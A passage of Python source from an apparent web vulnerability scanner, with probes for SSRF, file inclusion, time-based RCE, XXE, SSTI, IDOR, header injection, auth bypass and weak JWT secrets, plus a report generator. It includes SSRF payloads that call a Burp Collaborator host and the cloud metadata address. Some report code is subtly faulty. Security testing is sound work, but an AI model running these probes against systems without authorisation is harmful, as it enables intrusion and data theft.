    async def test_ssrf(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for SSRF vulnerabilities"""
        findings = []
        
        # Create a callback server to detect SSRF
        callback_domain = "ssrf." + str(uuid.uuid4())[:8] + ".burpcollaborator.net"
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in [
                    f"http://{callback_domain}",
                    f"http://169.254.169.254/latest/meta-data/"
                ]:
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        # Make request with short timeout
                        async with self.engine.session.get(test_url, timeout=5) as response:
                            # Check for AWS metadata or similar
                            response_text = await response.text()
                            if "instance-id" in response_text:
                                findings.append({
                                    "title": "Server-Side Request Forgery (SSRF)",
                                    "description": f"SSRF vulnerability in parameter '{param_name}'",
                                    "severity": "critical",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "Able to access internal metadata",
                                    "confidence": "high"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_lfi(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for LFI/RFI vulnerabilities"""
        findings = []
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in self.payloads.get_payloads("lfi")[:5]:
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        async with self.engine.session.get(test_url) as response:
                            response_text = await response.text()
                            
                            # Check for /etc/passwd contents
                            if "root:x:0:0:" in response_text:
                                findings.append({
                                    "title": "Local File Inclusion (LFI)",
                                    "description": f"LFI vulnerability in parameter '{param_name}'",
                                    "severity": "critical",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "/etc/passwd file accessed",
                                    "confidence": "high"
                                })
                            elif "phpinfo()" in response_text:
                                findings.append({
                                    "title": "Remote File Inclusion (RFI)",
                                    "description": f"RFI vulnerability in parameter '{param_name}'",
                                    "severity": "critical",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "PHP code execution via RFI",
                                    "confidence": "high"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_rce(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for Remote Code Execution"""
        findings = []
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in self.payloads.get_payloads("rce")[:3]:
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        # Time-based detection
                        start_time = time.time()
                        async with self.engine.session.get(test_url, timeout=10) as response:
                            await response.text()
                        end_time = time.time()
                        
                        # Check for time delay (sleep payload)
                        if "sleep" in payload and (end_time - start_time) > 4:
                            findings.append({
                                "title": "Remote Code Execution (Time-based)",
                                "description": f"Time-based RCE in parameter '{param_name}'",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Response delayed by {end_time - start_time:.2f}s",
                                "confidence": "medium"
                            })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_xxe(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for XXE vulnerabilities"""
        findings = []
        
        # Test XML endpoints
        for endpoint in endpoints[:20]:
            if "xml" in endpoint["url"] or "soap" in endpoint["url"].lower():
                for payload in self.payloads.get_payloads("xxe")[:2]:
                    try:
                        async with self.engine.session.post(
                            endpoint["url"],
                            data=payload,
                            headers={"Content-Type": "application/xml"}
                        ) as response:
                            response_text = await response.text()
                            
                            if "root:" in response_text or "daemon:" in response_text:
                                findings.append({
                                    "title": "XML External Entity (XXE) Injection",
                                    "description": "XXE vulnerability in XML endpoint",
                                    "severity": "critical",
                                    "url": endpoint["url"],
                                    "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                                    "evidence": "File contents extracted via XXE",
                                    "confidence": "high"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_ssti(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for SSTI vulnerabilities"""
        findings = []
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in self.payloads.get_payloads("ssti")[:3]:
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        async with self.engine.session.get(test_url) as response:
                            response_text = await response.text()
                            
                            # Check for SSTI evaluation
                            if "49" in response_text and payload in ["{{7*7}}", "${7*7}"]:
                                findings.append({
                                    "title": "Server-Side Template Injection (SSTI)",
                                    "description": f"SSTI vulnerability in parameter '{param_name}'",
                                    "severity": "critical",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "Template expression evaluated (7*7=49)",
                                    "confidence": "high"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_idor(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for IDOR vulnerabilities"""
        findings = []
        
        # Look for numeric IDs in URLs
        for endpoint in endpoints[:20]:
            url = endpoint["url"]
            
            # Find numeric parameters
            numeric_params = re.findall(r'/(\d+)/', url)
            
            for param_value in numeric_params[:3]:
                # Try incrementing/decrementing the ID
                for new_value in [str(int(param_value) + 1), str(int(param_value) - 1)]:
                    test_url = url.replace(f"/{param_value}/", f"/{new_value}/")
                    
                    try:
                        async with self.engine.session.get(test_url) as response:
                            if response.status == 200:
                                findings.append({
                                    "title": "Insecure Direct Object Reference (IDOR)",
                                    "description": f"IDOR vulnerability with ID {param_value}",
                                    "severity": "high",
                                    "url": test_url,
                                    "original_id": param_value,
                                    "tested_id": new_value,
                                    "evidence": f"Accessible resource with ID {new_value}",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_open_redirect(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for Open Redirect vulnerabilities"""
        findings = []
        
        redirect_params = ["redirect", "url", "next", "return", "dest", "goto"]
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                if param["name"].lower() in redirect_params:
                    param_name = param["name"]
                    
                    for payload in self.payloads.get_payloads("redirect")[:3]:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        try:
                            async with self.engine.session.get(test_url, allow_redirects=False) as response:
                                if response.status in [301, 302, 307, 308]:
                                    location = response.headers.get("location", "")
                                    if payload in location:
                                        findings.append({
                                            "title": "Open Redirect",
                                            "description": f"Open redirect in parameter '{param_name}'",
                                            "severity": "medium",
                                            "url": test_url,
                                            "parameter": param_name,
                                            "payload": payload,
                                            "evidence": f"Redirects to {location}",
                                            "confidence": "high"
                                        })
                        
                        except Exception as e:
                            pass
        
        return findings
    
    async def test_crlf_injection(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for CRLF Injection vulnerabilities"""
        findings = []
        
        for endpoint in endpoints[:30]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in self.payloads.get_payloads("crlf")[:2]:
                    test_url = self._inject_payload(url, param_name, payload)
                    
                    try:
                        async with self.engine.session.get(test_url, allow_redirects=False) as response:
                            headers = str(response.headers).lower()
                            
                            if "malicious" in headers or "x-injected" in headers:
                                findings.append({
                                    "title": "CRLF Injection",
                                    "description": f"CRLF injection in parameter '{param_name}'",
                                    "severity": "medium",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "Injected headers found in response",
                                    "confidence": "high"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_host_header_injection(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for Host Header Injection"""
        findings = []
        
        for endpoint in endpoints[:10]:
            url = endpoint["url"]
            
            for payload in self.payloads.get_payloads("host")[:2]:
                try:
                    headers = {"Host": payload}
                    async with self.engine.session.get(url, headers=headers) as response:
                        response_text = await response.text()
                        
                        # Check if host is reflected
                        if payload in response_text:
                            findings.append({
                                "title": "Host Header Injection",
                                "description": "Host header value reflected in response",
                                "severity": "medium",
                                "url": url,
                                "payload": payload,
                                "evidence": "Host header value reflected",
                                "confidence": "medium"
                            })
                
                except Exception as e:
                    pass
        
        return findings
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        query = parsed.query
        
        if query:
            # Replace parameter value
            new_query = []
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == param_name:
                        new_query.append(f"{key}={quote(payload)}")
                    else:
                        new_query.append(param)
                else:
                    new_query.append(param)
            
            new_query_str = '&'.join(new_query)
            return url.replace(query, new_query_str)
        else:
            # Add parameter
            return f"{url}?{param_name}={quote(payload)}"

# ============================================================================
# API SECURITY TESTER
# ============================================================================

class APISecurityTester:
    """API Security Testing Module"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
    
    async def test(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test API endpoints for security issues"""
        findings = []
        
        # Identify API endpoints
        api_endpoints = []
        for endpoint in endpoints:
            url = endpoint["url"]
            if any(api_indicator in url.lower() for api_indicator in 
                  ["/api/", "/v1/", "/v2/", "/rest/", "/graphql", "/swagger", "/openapi"]):
                api_endpoints.append(endpoint)
        
        if not api_endpoints:
            return findings
        
        print(f"  [+] Testing {len(api_endpoints)} API endpoints")
        
        # Test each API endpoint
        for endpoint in api_endpoints[:20]:  # Limit for performance
            url_findings = await self.test_api_endpoint(endpoint)
            findings.extend(url_findings)
        
        return findings
    
    async def test_api_endpoint(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test a single API endpoint"""
        findings = []
        url = endpoint["url"]
        
        # Test HTTP methods
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
        
        for method in methods:
            try:
                async with self.engine.session.request(method, url) as response:
                    # Check for missing authentication
                    if response.status == 401 or response.status == 403:
                        # Try without authentication
                        pass
                    
                    # Check for information disclosure in errors
                    if response.status >= 500:
                        response_text = await response.text()
                        if any(info in response_text.lower() for info in 
                              ["stack trace", "exception", "error at", "line", "file"]):
                            findings.append({
                                "title": "API Information Disclosure",
                                "description": f"Information disclosure in {method} {url}",
                                "severity": "medium",
                                "url": url,
                                "method": method,
                                "evidence": "Stack trace or error details exposed",
                                "confidence": "high"
                            })
                    
                    # Check for missing security headers
                    headers = response.headers
                    security_headers = ["Strict-Transport-Security", "X-Content-Type-Options", 
                                      "X-Frame-Options", "Content-Security-Policy"]
                    
                    missing_headers = []
                    for header in security_headers:
                        if header not in headers:
                            missing_headers.append(header)
                    
                    if missing_headers:
                        findings.append({
                            "title": "Missing Security Headers in API",
                            "description": f"Missing security headers in {method} {url}",
                            "severity": "low",
                            "url": url,
                            "method": method,
                            "evidence": f"Missing: {', '.join(missing_headers)}",
                            "confidence": "high"
                        })
            
            except Exception as e:
                pass
        
        # Test for GraphQL introspection
        if "graphql" in url.lower():
            graphql_findings = await self.test_graphql(url)
            findings.extend(graphql_findings)
        
        # Test for JWT vulnerabilities
        if self.engine.config.auth_token and "jwt" in self.engine.config.auth_token.lower():
            jwt_findings = await self.test_jwt(url)
            findings.extend(jwt_findings)
        
        return findings
    
    async def test_graphql(self, url: str) -> List[Dict[str, Any]]:
        """Test GraphQL endpoints"""
        findings = []
        
        # Test for introspection
        introspection_query = {
            "query": """
            {
              __schema {
                types {
                  name
                  fields {
                    name
                  }
                }
              }
            }
            """
        }
        
        try:
            async with self.engine.session.post(
                url,
                json=introspection_query,
                headers={"Content-Type": "application/json"}
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    if "data" in data and "__schema" in data["data"]:
                        findings.append({
                            "title": "GraphQL Introspection Enabled",
                            "description": "GraphQL introspection endpoint is accessible",
                            "severity": "medium",
                            "url": url,
                            "evidence": "GraphQL schema accessible via introspection",
                            "confidence": "high"
                        })
        
        except Exception as e:
            pass
        
        return findings
    
    async def test_jwt(self, url: str) -> List[Dict[str, Any]]:
        """Test JWT token vulnerabilities"""
        findings = []
        
        if not self.engine.config.auth_token:
            return findings
        
        # Test for "none" algorithm vulnerability
        try:
            import jwt as pyjwt
        except ImportError:
            return findings
        
        try:
            # Decode token without verification
            decoded = pyjwt.decode(
                self.engine.config.auth_token,
                options={"verify_signature": False}
            )
            
            # Check algorithm
            header = pyjwt.get_unverified_header(self.engine.config.auth_token)
            
            if header.get("alg") == "none":
                findings.append({
                    "title": "JWT 'none' Algorithm Vulnerability",
                    "description": "JWT token uses 'none' algorithm (no signature verification)",
                    "severity": "critical",
                    "url": url,
                    "evidence": "alg: none in JWT header",
                    "confidence": "high"
                })
            
            # Check for weak HMAC key
            if header.get("alg", "").startswith("HS"):
                # Try common weak secrets
                weak_secrets = ["secret", "password", "123456", "admin", "changeme"]
                for secret in weak_secrets:
                    try:
                        pyjwt.decode(self.engine.config.auth_token, secret, algorithms=[header["alg"]])
                        findings.append({
                            "title": "Weak JWT Secret",
                            "description": f"JWT token signed with weak secret: {secret}",
                            "severity": "high",
                            "url": url,
                            "evidence": f"Token verifiable with secret: {secret}",
                            "confidence": "high"
                        })
                        break
                    except:
                        pass
        
        except Exception as e:
            pass
        
        return findings

# ============================================================================
# AUTHENTICATION TESTER
# ============================================================================

class AuthenticationTester:
    """Authentication Testing Module"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
    
    async def test(self) -> List[Dict[str, Any]]:
        """Test authentication mechanisms"""
        findings = []
        
        print("  [+] Testing authentication bypass...")
        
        # Test common authentication bypass techniques
        bypass_findings = await self.test_auth_bypass()
        findings.extend(bypass_findings)
        
        print("  [+] Testing session management...")
        
        # Test session management issues
        session_findings = await self.test_session_management()
        findings.extend(session_findings)
        
        print("  [+] Testing 2FA bypass...")
        
        # Test 2FA bypass
        twofa_findings = await self.test_2fa_bypass()
        findings.extend(twofa_findings)
        
        return findings
    
    async def test_auth_bypass(self) -> List[Dict[str, Any]]:
        """Test authentication bypass techniques"""
        findings = []
        
        # Test common auth bypass payloads
        test_urls = [
            f"{self.engine.config.target}/admin",
            f"{self.engine.config.target}/dashboard",
            f"{self.engine.config.target}/admin.php",
            f"{self.engine.config.target}/wp-admin"
        ]
        
        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-Host": "localhost"},
            {"Host": "localhost"}
        ]
        
        for url in test_urls:
            try:
                # First check if authentication is required
                async with self.engine.session.get(url) as response:
                    if response.status in [401, 403]:
                        # Try bypass techniques
                        for headers in bypass_headers:
                            try:
                                async with self.engine.session.get(url, headers=headers) as bypass_response:
                                    if bypass_response.status == 200:
                                        findings.append({
                                            "title": "Authentication Bypass via Header Injection",
                                            "description": f"Auth bypass at {url} using headers",
                                            "severity": "critical",
                                            "url": url,
                                            "headers": headers,
                                            "evidence": f"Bypassed auth with headers: {headers}",
                                            "confidence": "medium"
                                        })
                                        break
                            except:
                                pass
            except:
                pass
        
        return findings
    
    async def test_session_management(self) -> List[Dict[str, Any]]:
        """Test session management vulnerabilities"""
        findings = []
        
        # Check if session cookies are secure
        try:
            async with self.engine.session.get(self.engine.config.target) as response:
                cookies = response.cookies
                
                for cookie in cookies.values():
                    # Check for missing secure flag on HTTPS
                    if self.engine.config.target.startswith("https") and not cookie.get("secure"):
                        findings.append({
                            "title": "Session Cookie Missing Secure Flag",
                            "description": "Session cookie transmitted over HTTPS without Secure flag",
                            "severity": "medium",
                            "url": self.engine.config.target,
                            "cookie": cookie.key,
                            "evidence": "Secure flag missing from session cookie",
                            "confidence": "high"
                        })
                    
                    # Check for missing HttpOnly flag
                    if not cookie.get("httponly"):
                        findings.append({
                            "title": "Session Cookie Missing HttpOnly Flag",
                            "description": "Session cookie accessible via JavaScript",
                            "severity": "low",
                            "url": self.engine.config.target,
                            "cookie": cookie.key,
                            "evidence": "HttpOnly flag missing from session cookie",
                            "confidence": "high"
                        })
        except:
            pass
        
        return findings
    
    async def test_2fa_bypass(self) -> List[Dict[str, Any]]:
        """Test 2FA bypass techniques"""
        findings = []
        
        # This would require authenticated testing
        # For now, check if there are 2FA-related endpoints
        twofa_endpoints = [
            f"{self.engine.config.target}/2fa",
            f"{self.engine.config.target}/two-factor",
            f"{self.engine.config.target}/verify",
            f"{self.engine.config.target}/otp",
            f"{self.engine.config.target}/totp"
        ]
        
        for endpoint in twofa_endpoints:
            try:
                async with self.engine.session.get(endpoint) as response:
                    if response.status == 200:
                        findings.append({
                            "title": "2FA Endpoint Discovered",
                            "description": f"2FA endpoint found at {endpoint}",
                            "severity": "info",
                            "url": endpoint,
                            "evidence": "2FA implementation detected",
                            "confidence": "medium"
                        })
            except:
                pass
        
        return findings

# ============================================================================
# MOBILE API TESTER
# ============================================================================

class MobileAPITester:
    """Mobile API Security Testing"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
    
    async def test(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test mobile API endpoints"""
        findings = []
        
        # Look for mobile API indicators
        mobile_endpoints = []
        for endpoint in endpoints:
            url = endpoint["url"].lower()
            if any(indicator in url for indicator in 
                  ["/mobile/", "/api/v1/", "/app/", "/android/", "/ios/"]):
                mobile_endpoints.append(endpoint)
        
        # Test mobile-specific vulnerabilities
        for endpoint in mobile_endpoints[:10]:
            endpoint_findings = await self.test_mobile_endpoint(endpoint)
            findings.extend(endpoint_findings)
        
        return findings
    
    async def test_mobile_endpoint(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test a mobile API endpoint"""
        findings = []
        url = endpoint["url"]
        
        # Check for API keys in URLs
        api_key_patterns = [
            r"api[_-]?key=([\w\-]+)",
            r"key=([\w\-]+)",
            r"token=([\w\-]+)",
            r"secret=([\w\-]+)"
        ]
        
        for pattern in api_key_patterns:
            matches = re.findall(pattern, url, re.IGNORECASE)
            if matches:
                for match in matches:
                    findings.append({
                        "title": "API Key in URL",
                        "description": "API key exposed in URL parameters",
                        "severity": "high",
                        "url": url,
                        "evidence": f"API key found: {match[:10]}...",
                        "confidence": "high"
                    })
        
        return findings

# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate comprehensive security reports"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
        
    async def generate(self, findings: List[Dict[str, Any]]):
        """Generate all report formats"""
        print("  [+] Generating HTML report...")
        await self.generate_html_report(findings)
        
        print("  [+] Generating JSON report...")
        await self.generate_json_report(findings)
        
        print("  [+] Generating PDF report...")
        await self.generate_pdf_report(findings)
        
        print("  [+] Generating executive summary...")
        await self.generate_executive_summary(findings)
    
    async def generate_html_report(self, findings: List[Dict[str, Any]]):
        """Generate interactive HTML report"""
        # Create reports directory
        reports_dir = "bug_hunter_reports"
        os.makedirs(reports_dir, exist_ok=True)
        
        # Sort findings by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(findings, key=lambda x: severity_order.get(x.get("severity", "info"), 5))
        
        # Group by severity
        by_severity = {}
        for finding in sorted_findings:
            severity = finding.get("severity", "info")
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)
        
        # Generate HTML
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Hunter Pro - Security Assessment Report</title>
    <style>
        :root {{
            --critical: #dc3545;
            --high: #fd7e14;
            --medium: #ffc107;
            --low: #28a745;
            --info: #17a2b8;
        }}
        
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f7fa; color: #333; line-height: 1.6; }}
        
        .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #1a237e 0%, #4a148c 100%); color: white; padding: 40px; border-radius: 10px; margin-bottom: 30px; text-align: center; }}
        .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
        .header .meta {{ opacity: 0.9; }}
        
        .summary-cards {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .card {{ background: white; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }}
        .card.critical {{ border-top: 5px solid var(--critical); }}
        .card.high {{ border-top: 5px solid var(--high); }}
        .card.medium {{ border-top: 5px solid var(--medium); }}
        .card.low {{ border-top: 5px solid var(--low); }}
        .card.info {{ border-top: 5px solid var(--info); }}
        
        .severity-badge {{ display: inline-block; padding: 4px 12px; border-radius: 20px; color: white; font-size: 12px; font-weight: bold; margin-right: 8px; }}
        .badge-critical {{ background: var(--critical); }}
        .badge-high {{ background: var(--high); }}
        .badge-medium {{ background: var(--medium); }}
        .badge-low {{ background: var(--low); }}
        .badge-info {{ background: var(--info); }}
        
        .finding {{ background: white; border-radius: 10px; margin-bottom: 20px; overflow: hidden; box-shadow: 0 3px 10px rgba(0,0,0,0.08); }}
        .finding-header {{ padding: 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; }}
        .finding-content {{ padding: 0; max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }}
        .finding-content.active {{ padding: 25px; max-height: 1000px; }}
        
        .details {{ margin-top: 20px; }}
        .detail-item {{ margin-bottom: 15px; }}
        .detail-item strong {{ display: block; margin-bottom: 5px; color: #555; }}
        
        .toggle-btn {{ background: none; border: none; color: #667eea; cursor: pointer; font-size: 1.2em; }}
        
        .stats {{ background: white; padding: 25px; border-radius: 10px; margin-bottom: 30px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; }}
        
        .risk-matrix {{ display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-top: 20px; }}
        .risk-cell {{ padding: 15px; text-align: center; border-radius: 5px; }}
        
        .export-buttons {{ text-align: center; margin: 30px 0; }}
        .export-btn {{ background: #667eea; color: white; border: none; padding: 12px 24px; border-radius: 25px; cursor: pointer; margin: 0 10px; font-weight: bold; }}
        
        @media print {{
            .export-buttons {{ display: none; }}
            .finding-content {{ max-height: none !important; padding: 25px !important; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐛 Bug Hunter Pro Security Report</h1>
            <div class="meta">
                <p>Target: {self.engine.config.target}</p>
                <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>Scan Mode: {self.engine.config.mode.value.upper()}</p>
            </div>
        </div>
        
        <div class="summary-cards">
            <div class="card critical">
                <h2>{len(by_severity.get('critical', []))}</h2>
                <p>Critical</p>
            </div>
            <div class="card high">
                <h2>{len(by_severity.get('high', []))}</h2>
                <p>High</p>
            </div>
            <div class="card medium">
                <h2>{len(by_severity.get('medium', []))}</h2>
                <p>Medium</p>
            </div>
            <div class="card low">
                <h2>{len(by_severity.get('low', []))}</h2>
                <p>Low</p>
            </div>
            <div class="card info">
                <h2>{len(by_severity.get('info', []))}</h2>
                <p>Info</p>
            </div>
        </div>
        
        <div class="stats">
            <h3>Scan Statistics</h3>
            <div class="stats-grid">
                <div>
                    <h4>{len(findings)}</h4>
                    <p>Total Findings</p>
                </div>
                <div>
                    <h4>{self.engine.stats.get('subdomains_discovered', 0)}</h4>
                    <p>Subdomains</p>
                </div>
                <div>
                    <h4>{self.engine.stats.get('endpoints_found', 0)}</h4>
                    <p>Endpoints</p>
                </div>
            </div>
        </div>
        
        <h2 style="margin-bottom: 20px;">Vulnerability Findings</h2>
        
        <div class="findings-container">
"""
        
        # Add findings
        for severity in ["critical", "high", "medium", "low", "info"]:
            if severity in by_severity:
                html_content += f'<h3 style="margin: 20px 0 10px 0; color: var(--{severity});">{severity.upper()} SEVERITY ({len(by_severity[severity])})</h3>'
                
                for i, finding in enumerate(by_severity[severity]):
                    html_content += f"""
            <div class="finding">
                <div class="finding-header" onclick="toggleFinding({i}_{severity})">
                    <div>
                        <span class="severity-badge badge-{severity}">{severity.upper()}</span>
                        <strong>{finding.get('title', 'Unknown')}</strong>
                    </div>
                    <button class="toggle-btn">▼</button>
                </div>
                <div class="finding-content" id="finding-{i}_{severity}">
                    <p><strong>Description:</strong> {finding.get('description', 'No description')}</p>
                    <p><strong>URL:</strong> <a href="{finding.get('url', '#')}" target="_blank">{finding.get('url', 'N/A')}</a></p>
                    <p><strong>Confidence:</strong> {finding.get('confidence', 'Unknown').upper()}</p>
                    
                    <div class="details">
                        <div class="detail-item">
                            <strong>Evidence:</strong>
                            <pre style="background: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto;">{html.escape(str(finding.get('evidence', 'No evidence')))}</pre>
                        </div>
                        
                        {f'<p><strong>Parameter:</strong> {finding.get("parameter", "N/A")}</p>' if finding.get("parameter") else ''}
                        {f'<p><strong>Payload:</strong> <code>{html.escape(str(finding.get("payload", "")))}</code></p>' if finding.get("payload") else ''}
                    </div>
                    
                    <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
                        <strong>Remediation:</strong>
                        <p>{self.get_remediation_advice(finding.get('title', ''))}</p>
                    </div>
                </div>
            </div>
"""
        
        html_content += """
        </div>
        
        <div class="export-buttons">
            <button class="export-btn" onclick="window.print()">Print Report</button>
            <button class="export-btn" onclick="exportToJSON()">Export JSON</button>
            <button class="export-btn" onclick="downloadPDF()">Download PDF</button>
        </div>
    </div>
    
    <script>
        function toggleFinding(id) {
            const content = document.getElementById('finding-' + id);
            const btn = content.previousElementSibling.querySelector('.toggle-btn');
            
            content.classList.toggle('active');
            btn.textContent = content.classList.contains('active') ? '▲' : '▼';
        }
        
        // Expand all critical findings by default
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-expand critical findings
            const criticalElements = document.querySelectorAll('.badge-critical').forEach(el => {
                const header = el.closest('.finding-header');
                if (header) {
                    const id = header.getAttribute('onclick').match(/toggleFinding\\(([^)]+)\\)/)[1];
                    toggleFinding(id);
                }
            });
        });
        
        function exportToJSON() {
            const data = """ + json.dumps(findings, indent=2) + """;
            const blob = new Blob([data], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'bug_hunter_findings.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        function downloadPDF() {
            alert('PDF generation would require server-side processing. JSON export available.');
        }
    </script>
</body>
</html>
"""
        
        # Save HTML file
        filename = f"{reports_dir}/security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"    [✓] HTML report saved: {filename}")
    
    async def generate_json_report(self, findings: List[Dict[str, Any]]):
        """Generate JSON report"""
        reports_dir = "bug_hunter_reports"
        os.makedirs(reports_dir, exist_ok=True)
        
        # Calculate duration safely
        start_time = self.engine.stats.get("start_time")
        end_time = self.engine.stats.get("end_time", datetime.now())
        
        if start_time and end_time:
            duration = end_time - start_time
        else:
            duration = timedelta(0)
        
        report = {
            "metadata": {
                "target": self.engine.config.target,
                "scan_date": datetime.now().isoformat(),
                "scan_mode": self.engine.config.mode.value,
                "scan_duration": str(duration),
                "findings_count": len(findings)
            },
            "statistics": self.engine.stats,
            "findings": findings
        }
        
        filename = f"{reports_dir}/security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"    [✓] JSON report saved: {filename}")
    
    async def generate_pdf_report(self, findings: List[Dict[str, Any]]):
        """Generate PDF report (simplified version)"""
        try:
            import markdown
            from weasyprint import HTML
            
            # Create markdown content
            md_content = f"""
# Bug Hunter Pro Security Assessment Report

**Target:** {self.engine.config.target}
**Scan Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Scan Mode:** {self.engine.config.mode.value.upper()}

## Executive Summary

Total Findings: {len(findings)}

### Severity Breakdown:
- Critical: {len([f for f in findings if f.get('severity') == 'critical'])}
- High: {len([f for f in findings if f.get('severity') == 'high'])}
- Medium: {len([f for f in findings if f.get('severity') == 'medium'])}
- Low: {len([f for f in findings if f.get('severity') == 'low'])}
- Info: {len([f for f in findings if f.get('severity') == 'info'])}

## Detailed Findings

"""
            
            for i, finding in enumerate(findings, 1):
                md_content += f"""
### {i}. {finding.get('title', 'Unknown')} [{finding.get('severity', 'info').upper()}]

**Description:** {finding.get('description', 'No description')}

**URL:** {finding.get('url', 'N/A')}

**Confidence:** {finding.get('confidence', 'Unknown').upper()}

**Evidence:**

**Remediation:**
{self.get_remediation_advice(finding.get('title', ''))}

---
"""
            
            # Convert to HTML
            html_content = markdown.markdown(md_content)
            
            # Save as PDF
            reports_dir = "bug_hunter_reports"
            filename = f"{reports_dir}/security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
            
            HTML(string=html_content).write_pdf(filename)
            print(f"    [✓] PDF report saved: {filename}")
            
        except ImportError:
            print("    [!] Install weasyprint and markdown for PDF reports: pip install weasyprint markdown")
    
    async def generate_executive_summary(self, findings: List[Dict[str, Any]]):
        """Generate executive summary"""
        reports_dir = "bug_hunter_reports"
        os.makedirs(reports_dir, exist_ok=True)
        
        # Calculate duration safely
